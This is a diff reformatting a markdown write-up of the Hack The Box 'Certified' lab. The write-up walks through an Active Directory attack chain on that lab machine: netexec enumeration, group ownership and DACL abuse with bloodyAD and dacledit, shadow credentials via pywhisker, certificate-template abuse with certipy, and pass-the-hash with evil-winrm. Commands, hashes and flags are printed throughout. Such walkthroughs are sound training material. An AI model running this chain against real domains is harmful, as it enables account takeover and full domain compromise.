@@ -1,19 +1,17 @@
 ---
 sticker: emoji//1f9d1-200d-1f3eb
 ---
+# ENUMERATION
+---
 
-# CERTIFIED
 
-## ENUMERATION
 
-***
+## OPEN PORTS
+---
 
-### OPEN PORTS
-
-***
 
 | PORT | SERVICE      |
-| ---- | ------------ |
+| :--- | :----------- |
 | 53   | domain       |
 | 88   | kerberos-sec |
 | 135  | msrpc        |
@@ -21,20 +19,23 @@ sticker: emoji//1f9d1-200d-1f3eb
 | 389  | ldap         |
 | 445  | microsoft-ds |
 | 464  | kpasswd5     |
-| 593  | ncacn\_http  |
+| 593  | ncacn_http   |
 | 636  | ssl/ldap     |
 | 3268 | ldap         |
 | 3269 | ssl/ldap     |
 | 5985 | http         |
 | 9389 | mc-nmf       |
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250312100202.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250312100202.png)
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
+
 
 Let's start with some basic SMB enumeration:
+
 
 ```
 netexec smb 10.10.11.41
@@ -43,6 +44,7 @@ SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019
 ```
 
 We got the domain name: `certified.htb`, let's keep on enumerating:
+
 
 ```
 netexec smb 10.10.11.41 -u 'judith.mader' -p 'judith09'
@@ -84,28 +86,26 @@ LDAP        10.10.11.41     389    DC01             Compressing output into /hom
 
 Now, let's analyze the data with bloodhound:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250312104456.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250312104456.png)
 
 For all kerberoastable accounts we find `management_svc`, let's keep on searching:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250312104920.png) ![](gitbook/cybersecurity/images/Pasted%20image%2020250312110254.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250312104920.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250312110254.png)
 
 So, after enumerating all, we can point out these key features:
 
 1. `judith.mader` permissions:
-
-* `WriteOwner` permissions on the `Management Group`
-
+- `WriteOwner` permissions on the `Management Group`
 2. `management_svc` permissions:
-
-* `GenericWrite` permissions on the `Management Group`
-* `GenericAll` permissions over the `ca_operator` account
+- `GenericWrite` permissions on the `Management Group`
+- `GenericAll` permissions over the `ca_operator` account
 
 With this info, we can start exploitation.
 
-## EXPLOITATION
 
-***
+# EXPLOITATION
+---
 
 Once we know the permissions we have, we can start escalating our privileges, let's start with using the `WriteOwner` permission of `judith.mader` to set that user as owner of the management group, for this, let's use `bloodyAD`:
 
@@ -117,6 +117,7 @@ bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09"
 
 Nice, we are now owner of the management group, let's update the group permissions to enable the write permission, for this, we can use `dacledit`:
 
+
 ```
 sudo python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09'
 
@@ -124,7 +125,9 @@ sudo python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judi
 [*] DACL modified successfully
 ```
 
+
 Next step would be adding `judith.mader` to Management group:
+
 
 ```
 bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
@@ -132,7 +135,7 @@ bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' a
 [+] judith.mader added to Management
 ```
 
-There we go, now, we can exploit **KeyCredentialLink**, **KeyCredentialLink** is an attribute in Active Directory (AD) that stores **public key credentials** linked to a user or computer account. These credentials are used for modern authentication methods like **Windows Hello for Business** or **FIDO2 security keys**. When exploited, this attribute allows attackers to **add their own malicious public key** to a target account, enabling authentication **without knowing the account's password**.
+There we go, now, we can exploit **KeyCredentialLink**, **KeyCredentialLink** is an attribute in Active Directory (AD) that stores **public key credentials** linked to a user or computer account. These credentials are used for modern authentication methods like **Windows Hello for Business** or **FIDO2 security keys**. When exploited, this attribute allows attackers to **add their own malicious public key** to a target account, enabling authentication **without knowing the account's password**.
 
 In order to exploit this, we can use `pywhisker`:
 
@@ -231,11 +234,12 @@ a091c1832bcdd4677c28b5a6a1295584
 
 There we go, we got our ticket, with this, we could go inside Winrm and get our user flag, but let's proceed with privilege escalation.
 
-## PRIVILEGE ESCALATION
 
-***
+# PRIVILEGE ESCALATION
+---
 
-From what we found at the reconnaissance stage, we discovered that `management_svc` has `GenericAll` permission over `ca_operator` account, **GenericAll** is a powerful permission in Active Directory (AD) that grants **full control** over a target object (e.g., a user, group, computer, or organizational unit). If a user or group has the `GenericAll` privilege over another object, they can perform **any action** on that object, including modifying its attributes, resetting passwords, deleting it, or adding/removing members (for groups).
+
+From what we found at the reconnaissance stage, we discovered that `management_svc` has `GenericAll` permission over `ca_operator` account, **GenericAll** is a powerful permission in Active Directory (AD) that grants **full control** over a target object (e.g., a user, group, computer, or organizational unit). If a user or group has the `GenericAll` privilege over another object, they can perform **any action** on that object, including modifying its attributes, resetting passwords, deleting it, or adding/removing members (for groups).
 
 So, let's break down our privilege escalation, we can work our way into admin in the following way:
 
@@ -251,27 +255,29 @@ So, let's break down our privilege escalation, we can work our way into admin in
 
 We can check our key terms:
 
-#### **Key Terms & Techniques**
+### **Key Terms & Techniques**
 
 1. **GenericAll Rights**:
-   * A permission granting full control over an AD object (e.g., user, group).
+    - A permission granting full control over an AD object (e.g., user, group).
+
 2. **KeyCredentialLink**:
 
-* An AD attribute storing public keys for certificate-based authentication.
+- An AD attribute storing public keys for certificate-based authentication.
 
 3. **UserPrincipalName (UPN)**:
 
-* An identifier formatted as `user@domain` (e.g., `administrator@certified.htb`).
+- An identifier formatted as `user@domain` (e.g., `administrator@certified.htb`).
 
 4. **Certificate Template Misconfiguration**:
 
-* A vulnerable template (`CertifiedAuthentication`) allowed enrollment without proper validation.
+- A vulnerable template (`CertifiedAuthentication`) allowed enrollment without proper validation.
 
 5. **PKINIT Authentication**:
 
-* Kerberos authentication using certificates instead of passwords.
+- Kerberos authentication using certificates instead of passwords.
 
 Ok, once we've structured all, let's put it into practice:
+
 
 **Adding KeyCredential**
 
@@ -353,6 +359,7 @@ certipy-ad auth -pfx administrator.pfx -domain certified.htb
 
 There we go, we got our hash and can now authenticate using `evil-winrm`:
 
+
 ```
 evil-winrm -u administrator -H 0d5b49608bbce1751f708748f67e2d34 -i 10.10.11.41
 
@@ -371,6 +378,7 @@ There we go, we successfully pwned this machine, let's read both flags:
 e0b8d6567066b1694c8c65817163a553
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250312125720.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250312125720.png)
 
 https://www.hackthebox.com/achievement/machine/1872557/633
+
